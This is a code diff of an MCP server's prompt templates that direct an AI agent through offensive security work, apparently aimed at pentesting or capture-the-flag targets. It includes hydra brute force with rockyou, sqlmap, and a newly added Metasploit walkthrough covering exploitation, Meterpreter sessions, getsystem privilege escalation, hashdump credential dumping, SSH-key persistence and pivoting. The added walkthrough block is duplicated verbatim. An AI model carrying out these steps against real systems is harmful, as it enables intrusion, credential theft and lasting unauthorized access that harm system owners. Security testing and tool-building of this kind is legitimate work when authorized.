@@ -42,7 +42,7 @@ PHASE 2 — SERVICE-SPECIFIC ENUMERATION
   Based on open ports found in Phase 1:
   • Port 80 / 443 / 8080 → run nikto_scan AND gobuster_scan
   • Port 139 / 445       → run enum4linux_scan
-  • Port 21              → run execute_command("ftp -n {target}") to test anonymous login
+  • Port 21              → run execute_shell("ftp -n {target}") to test anonymous login
   • Port 22              → note for potential hydra_attack later
   • Port 3306 / 5432     → note for potential sqlmap or hydra later
 
@@ -94,7 +94,7 @@ STEP 2 — CONTENT DISCOVERY
 
 STEP 3 — CMS DETECTION
   • If WordPress signs found → wpscan_analyze on {url} with additional_args="--enumerate vp,u"
-  • If Joomla / Drupal → execute_command with appropriate scanner
+  • If Joomla / Drupal → execute_shell with appropriate scanner
 
 STEP 4 — INJECTION TESTING
   • sqlmap_scan on {url} — test GET parameters first
@@ -283,7 +283,7 @@ STEP 2 — ATTACK
     - service = {service}
     - Try each username in: {usernames}
     - Start with password_file = /usr/share/wordlists/rockyou.txt
-    - additional_args = "-t 4 -W 3" (4 threads, 3s wait — avoids lockouts)
+    - additional_args = "-W 3" (3s wait between attempts — avoids lockouts; -t is already set)
 
 STEP 3 — IF HASHES AVAILABLE
   • john_crack with appropriate format_type
@@ -442,8 +442,10 @@ STEP 3 — EVALUATE RESULTS
   - CVE number (note for reporting)
 
 STEP 4 — EXPLOITATION
-  • If a reliable Metasploit module exists:
-    metasploit_run(module="<path>", options={{"RHOSTS": "<target>", "LHOST": "<your_ip>", "LPORT": 4444}})
+  • If a reliable Metasploit module exists and requires only a single run:
+    metasploit_run(module="<path>", options={"RHOSTS": "<target>", "LHOST": "<your_ip>", "LPORT": 4444})
+  • If the exploit opens a session or needs interaction (handler, post modules, session commands):
+    msf_console(commands=["use <path>", "set RHOSTS <target>", "set LHOST <your_ip>", "set LPORT 4444", "run"])
   • If a standalone script:
     execute_command("python3 <exploit_path> <target>")
 
@@ -452,6 +454,154 @@ STEP 5 — POST-EXPLOITATION (if exploit succeeds)
   • Or: ssh_command to run specific commands on the target
 
 Report the CVE, exploit used, and whether it was authenticated or unauthenticated.
+"""
+
+    # -----------------------------------------------------------------------
+    # Metasploit interactive session walkthrough
+    # -----------------------------------------------------------------------
+    @mcp.prompt(name="msf_session")
+    def prompt_msf_session(target: str, module: str, lhost: str, lport: str = "4444") -> str:
+        """
+        Walk through a full Metasploit exploitation and session interaction flow.
+
+        WHEN TO USE: When you need to exploit a target with Metasploit AND
+        interact with the resulting session — not just fire and forget.
+
+        Args:
+            target: Target IP or hostname
+            module: Metasploit module path e.g. exploit/unix/ftp/vsftpd_234_backdoor
+            lhost:  Your tun0/attack IP
+            lport:  Listener port (default 4444)
+        """
+        return f"""
+You are running a Metasploit exploitation chain against: {target}
+Module: {module}
+LHOST:  {lhost}  LPORT: {lport}
+
+Use msf_console with an ordered commands list. Never use metasploit_run for
+flows that require session interaction — it cannot read back session output.
+
+STEP 1 — CONFIGURE AND EXPLOIT
+  msf_console(
+    commands=[
+      "use {module}",
+      "set RHOSTS {target}",
+      "set LHOST {lhost}",
+      "set LPORT {lport}",
+      "show options",      # verify before firing
+      "run"
+    ],
+    step_timeout=60        # increase if the exploit is slow
+  )
+
+STEP 2 — CHECK FOR OPEN SESSIONS
+  msf_console(commands=["sessions"], step_timeout=15)
+  • If sessions list is empty → the exploit did not land, revisit module choice
+  • If a session is open → note the session ID (e.g. 1)
+
+STEP 3 — INTERACT WITH THE SESSION
+  For a shell session:
+    msf_console(commands=["sessions -i 1", "whoami", "id", "hostname"], step_timeout=20)
+
+  For a Meterpreter session:
+    msf_console(
+      commands=["sessions -i 1", "getuid", "sysinfo", "getpid",
+                "getsystem",          # attempt auto privesc
+                "hashdump"],          # dump hashes if SYSTEM
+      step_timeout=30
+    )
+
+STEP 4 — POST MODULES (optional)
+  msf_console(
+    commands=[
+      "background",
+      "use post/multi/recon/local_exploit_suggester",
+      "set SESSION 1",
+      "run"
+    ],
+    step_timeout=120
+  )
+
+STEP 5 — PERSIST OR PIVOT (if needed)
+  • Persistence: use post/linux/manage/sshkey_persistence or post/windows/manage/persistence
+  • Pivot:       route add <subnet> 1  then use auxiliary/server/socks_proxy
+
+Always call msf_console with step_timeout high enough for slow operations.
+Background a session with "background" before running post modules.
+"""
+
+    # -----------------------------------------------------------------------
+    # Metasploit interactive session walkthrough
+    # -----------------------------------------------------------------------
+    @mcp.prompt(name="msf_session")
+    def prompt_msf_session(target: str, module: str, lhost: str, lport: str = "4444") -> str:
+        """
+        Walk through a full Metasploit exploitation and session interaction flow.
+
+        WHEN TO USE: When you need to exploit a target with Metasploit AND
+        interact with the resulting session — not just fire and forget.
+
+        Args:
+            target: Target IP or hostname
+            module: Metasploit module path e.g. exploit/unix/ftp/vsftpd_234_backdoor
+            lhost:  Your tun0/attack IP
+            lport:  Listener port (default 4444)
+        """
+        return f"""
+You are running a Metasploit exploitation chain against: {target}
+Module: {module}
+LHOST:  {lhost}  LPORT: {lport}
+
+Use msf_console with an ordered commands list. Never use metasploit_run for
+flows that require session interaction — it cannot read back session output.
+
+STEP 1 — CONFIGURE AND EXPLOIT
+  msf_console(
+    commands=[
+      "use {module}",
+      "set RHOSTS {target}",
+      "set LHOST {lhost}",
+      "set LPORT {lport}",
+      "show options",      # verify before firing
+      "run"
+    ],
+    step_timeout=60        # increase if the exploit is slow
+  )
+
+STEP 2 — CHECK FOR OPEN SESSIONS
+  msf_console(commands=["sessions"], step_timeout=15)
+  • If sessions list is empty → the exploit did not land, revisit module choice
+  • If a session is open → note the session ID (e.g. 1)
+
+STEP 3 — INTERACT WITH THE SESSION
+  For a shell session:
+    msf_console(commands=["sessions -i 1", "whoami", "id", "hostname"], step_timeout=20)
+
+  For a Meterpreter session:
+    msf_console(
+      commands=["sessions -i 1", "getuid", "sysinfo", "getpid",
+                "getsystem",          # attempt auto privesc
+                "hashdump"],          # dump hashes if SYSTEM
+      step_timeout=30
+    )
+
+STEP 4 — POST MODULES (optional)
+  msf_console(
+    commands=[
+      "background",
+      "use post/multi/recon/local_exploit_suggester",
+      "set SESSION 1",
+      "run"
+    ],
+    step_timeout=120
+  )
+
+STEP 5 — PERSIST OR PIVOT (if needed)
+  • Persistence: use post/linux/manage/sshkey_persistence or post/windows/manage/persistence
+  • Pivot:       route add <subnet> 1  then use auxiliary/server/socks_proxy
+
+Always call msf_console with step_timeout high enough for slow operations.
+Background a session with "background" before running post modules.
 """
 
     # -----------------------------------------------------------------------
